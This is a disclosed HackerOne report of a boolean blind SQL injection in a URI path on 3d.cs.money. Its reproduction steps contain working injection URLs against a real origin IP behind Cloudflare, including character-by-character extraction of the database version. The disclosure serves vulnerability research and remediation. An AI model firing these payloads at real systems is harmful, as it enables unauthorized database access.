---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1107536'
original_report_id: '1107536'
title: Blind Based SQL Injection in 3d.sc.money
weakness: SQL Injection
team_handle: cs_money
created_at: '2021-02-19T19:33:11.017Z'
disclosed_at: '2021-04-16T10:20:51.622Z'
has_bounty: false
visibility: full
substate: informative
vote_count: 20
asset_identifier: 3d.cs.money
asset_type: URL
max_severity: medium
tags:
- hackerone
- sql-injection
---

# Blind Based SQL Injection in 3d.sc.money

## Metadata

- HackerOne Report ID: 1107536
- Weakness: SQL Injection
- Program: cs_money
- Disclosed At: 2021-04-16T10:20:51.622Z
- Has Bounty: No
- Visibility: full
- Substate: informative

## Original Report

Greetings, Hope Y'all good and fine!

## Summary:

I found a  Boolean Blind based SQL Injection in your website =>  3d.cs.money

It's a URI path injection. 

The vulnerability tested on the Original IP behind the CloudflareWAF and I've already reported this in my other report #1105673




### The Affected URI :

http://51.83.253.82/item/default %INJECTION_POINT_HERE%


## Steps To Reproduce:
Go to 


"http://51.83.253.82/item/default'and%20UPPER('asd')='asd'--"   => It will give you 404
BUT
"http://51.83.253.82/item/default'and%20UPPER('asd')='ASD'--" => It will give you 200







As a PoC I  extracted just the version number which is : `20.9.2.2`

and the steps to produce that  :

http://51.83.253.82/item/default'and%20substr(version(),1,1)='2'-- ==> will give you 200 OK
http://51.83.253.82/item/default'and%20substr(version(),2,1)='0'-- ==> will give you 200 OK
So on so fourth until you get the full version number.

## Impact

Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data. This can be used to alter query logic to bypass security checks, or to insert additional statements that modify the back-end database, possibly including execution of system commands.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
